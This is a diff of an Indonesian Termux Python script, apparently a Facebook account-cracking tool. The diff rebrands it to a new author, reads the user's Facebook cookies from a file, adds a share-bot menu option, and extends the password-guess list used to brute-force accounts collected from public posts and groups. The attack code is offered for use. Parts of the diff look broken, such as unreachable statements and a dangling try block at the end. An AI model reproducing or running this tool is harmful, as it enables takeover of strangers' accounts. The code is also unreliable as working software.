@@ -55,10 +55,10 @@ my_music = subprocess.call(["dpkg","-s","play-audio"],stdout=bff_2,stderr=subpro
 bff_2.close()
 if my_music !=0:
 	catet_play = ('# • sedang menginstall play-audio •')
-	play = rich.markdown.Markdown(catet_play, style='green')
+	play = rich.markdown.Markdown(catet_play, style='blue')
 	rich.console.Console().print(play)
 	os.system('pkg install play-audio')
-	
+from bs4 import BeautifulSoup as par
 Mr = '\x1b[1;91m' 
 Hj = '\x1b[1;92m' 
 Mt = '\x1b[0m'
@@ -67,15 +67,15 @@ def ingfoh():
 f"""{Hj}
  • Info script :
  	
- - author      : SadBoy
- - instagram   : Tidak Punya
- - facebook    : facebook.com/yiaa.id
- - fanspage    : Tidak Punya
- - whatsap     : +6281315504328
- - github      : github.com/DenyPrayoga
- - script name : bff-2
- - version     : 1.3
- - update pada : 21 Februari 2022
+ - author      : Ncek-XD
+ - instagram   : ncek-XD
+ - facebook    : facebook.com/
+ - fanspage    : facebook.com/
+ - whatsap     : +6283114591358
+ - github      : github.com/Ncek-XD
+ - script name : crack
+ - version     : 1.0
+ - update pada : 19 Maret 2022
  
 + ---------------------------------------- +
             TENTANG METODE CRACK
@@ -117,7 +117,7 @@ f"""{Hj}
 """)
 
 # MODULE
-import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
+import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64, calendar
 import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
 from concurrent.futures import ThreadPoolExecutor
 from bs4 import BeautifulSoup as parser
@@ -125,8 +125,11 @@ from threading import (Thread, Event)
 from time import sleep as jeda
 from datetime import datetime
 
+url_ip = "https://www.httpbin.org/ip"
+gab,exp,data_licensi = [],[],{}
 # TANGGAL BULAN 
 ct = datetime.now()
+hr = calendar.day_name
 n = ct.month
 bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
 try:
@@ -144,7 +147,7 @@ bullan = current.month
 
 waktu = ("%s-%s-%s"%(hari,bulan,tahun))
 bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
-
+tanggal = ("%s-%s-%s"%( hari, bulan, tahun));tgl = ("%s %s %s"%(hari, bullan, tahun))
 # KUMPULAN WARNA
 M = '\x1b[1;91m' # MERAH
 H = '\x1b[1;92m' # HIJAU
@@ -158,7 +161,7 @@ N = '\x1b[0m' # WARNA MATI
 acak = [M, H, K, B, U, O, P, J]
 warna = random.choice(acak)
 til ="•"
-cek = '-->'
+cek ="-->"
 
 ok, cp, id, user, pwx, loop = [], [], [], [], [], 0
 
@@ -190,17 +193,17 @@ except KeyError:
 	IP = " "
 	CN = " "
 
-author = 'SadBoy'
-fb_me = 'facebook.com/yiaa.id'
-github = 'github.com/DenyPrayoga'
+author = 'NCEK-XD'
+fb_me = 'facebook.com/ncek-XD'
+github = 'github.com/Ncek-XD'
 
 def banner():
 	os.system('clear')
-	logo = (f'# • Author : {SadBoy} •')
-	play = rich.markdown.Markdown(logo, style='red')
+	logo = (f'# • Author : {author} •')
+	play = rich.markdown.Markdown(logo, style='orange')
 	rich.console.Console().print(play)
 	print (' %s%s%s%s%s                                      %s%s%s%s%s%s\n%s   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n%s   |_____  |    \\_ |     | |_____  |    \\_\n\n %s%s%s%s%s%s                                      %s%s%s%s%s%s \n %s# %sFb  %s : %s%s \n %s# %sGit%s  : %s%s \n %s# %s---------------------------------------- %s#  '%
-	(til,M,til,H,til,M,til,K,til,H,til,M,P,M,til,K,til,H,til,M,til,K,til,H,til,U,O,M,O,fb_me,U,O,M,O,github,P,M,P))
+	(til,M,til,H,til,M,til,K,til,H,til,B,U,M,til,K,til,H,til,M,til,K,til,H,til,U,O,M,O,fb_me,U,O,M,O,github,B,M,B))
 	print (' %s#%s IP   %s:%s %s %s- %s%s '%(U,O,M,O,IP,H,O,CN))
     
 # CONVERT COOKIE DICT TO STRING
@@ -214,7 +217,7 @@ def romz_xyz(cookie,venom={}):
 # MENU MASUK
 def Masuk():
 	try:
-		   cek = open("cookies").read()
+		kueh = romz_xyz(open("data/cookies","r").read().strip())
 	except FileNotFoundError:
 		os.system('clear')
 		banner()
@@ -242,6 +245,7 @@ def Masuk():
 				tutorial = ('''# Untuk mendapatkan cookie siapkan aplikasi kiwi browser, download di play store jika belum. Jika sudah login kan akun facebook anda di kiwi browser, akun wajib mode data. Salin link: https://chrome.google.com/webstore/detail/get-cookie/naciaagbkifhpnoodlkhbejjldaiffcm/related. Ketik Y/y lalu enter untuk melihat tutorial lebih lengkap!''')
 				ah = rich.markdown.Markdown(tutorial, style='green')
 				rich.console.Console().print(ah)
+				
 				nanya = input('%s%s%s ingin melihat tutorial? %sy%s/%sn :%s '%(U,til,O,H,O,M,K))
 				if nanya in(""):
 					print ("%s%s saya bertanya wajib di jawab "%(M,til));jeda(2)
@@ -380,6 +384,7 @@ class Menu():
 			print ('%s[10] %sLihat hasil crack'%(U,B))
 			print ('%s[11] %sCheckpoint detektor'%(U,B))
 			print ('%s[12] %sInfo (tentang)'%(U,B))
+			print ('%s[13] %sBot Share (Id publik)'%(U,B))
 			print ('%s[rm] %sHapus data login'%(U,B))
 			print ('%s[00] %sKeluar (logout)'%(U,M))
 		
@@ -483,7 +488,7 @@ class pilihan:
 			except requests.exceptions.MissingSchema:
 				exit('\n%s%s Invalid url%s\n'%(M,til,N))
 		elif slut in["4","04"]:
-			print ("\n%s%s %sPastikan postingan bersifat publik tidak private "%(U,til,O))
+			print ("\n%s%s %sPastikan postingan bersifat publik tidak private "%(U,til,B))
 			idt = input('%s%s %sUrl/link postingan %s> %s'%(U,til,O,M,K))
 			if idt in[""," "]:
 				print ('\n%s%s isi yang benar'%(M,til));jeda(2)
@@ -514,8 +519,8 @@ class pilihan:
 				exit('\n%s%s Invalid url%s\n'%(M,til,N))
 		elif slut in["5","05"]:
 			while True:
-				print ("\n%s%s %sPastikan group bersifat publik tidak private "%(U,til,O))
-				idt = input('%s%s %sId group %s> %s'%(U,til,O,M,K))
+				print ("\n%s%s %sPastikan group bersifat publik tidak private "%(U,til,B))
+				idt = input('%s%s %sId group %s> %s'%(U,til,B,M,K))
 				if idt in[""," "]:
 					print ('\n%s%s isi yang benar'%(M,til));jeda(2)
 				else:
@@ -597,6 +602,8 @@ class pilihan:
 			file_cp()
 		elif slut in['12']:
 			ingfoh()
+		elif slut in['13']:
+			share_post()
 		elif slut in['RM','Rm','rm']:
 			print ('\n%s%s menghapus data login dari termux '%(M,til));jeda(1)
 			try:
@@ -1005,7 +1012,7 @@ class Crack:
 					try:
 						uid, name = akun.split('<=>')
 						ss = name.split(' ')
-						pwx = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345", ss[0]+"1234", "sayang", "kontol", "anjing" ]
+						pwx = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345", ss[0]+"1234", "sayang", "kontol", "anjing","bismillah","goblok","katasandi","gatau123","ganteng","cantik" ]
 						TitidNeverDie.submit(self.basic, uid, pwx)
 					except: pass
 			hasil(ok,cp)
@@ -1314,16 +1321,17 @@ def cek_apk(kukis):
 	game = [i.text for i in x.find_all("h3")]
 	try:
 		for i in range(len(game)):
-			print ("\r      %s%s. %s%s"%(P,i+[1],cek,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
+			print ("\r%s[Apk Aktif]%s%s%s%s"%(H,P,[i+1],H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
 	except AttributeError:
 		print ("\r      %s• cookie invalid"%(M))
+
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
 	sop = bs4.BeautifulSoup(w,"html.parser")
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
 	try:
 		for i in range(len(game)):
-			print ("\r      %s%s. %s%s"%(P,i+[1],cek,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
+			print ("\r%s[Apk Non-Aktif]%s%s%s%s"%(M,P,[i+1],M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
 	except AttributeError:
 		print ("\r      %s• cookie invalid"%(M))
 
@@ -2287,10 +2295,16 @@ def brute(email_dev, san_dev_):
 			exit("%s• Keluar...."%(M))
 		except:
 			exit()
+			
+			continue
+		
+		break
 
-if __name__=="__main__":
-	Masuk()
-	
+if __name__=='__main__':
+	try:os.mkdir('menu')
+	except:pass
+	try:os.mkdir('exit')
+		
 """
 
     Biar apa sih di decompile anyink
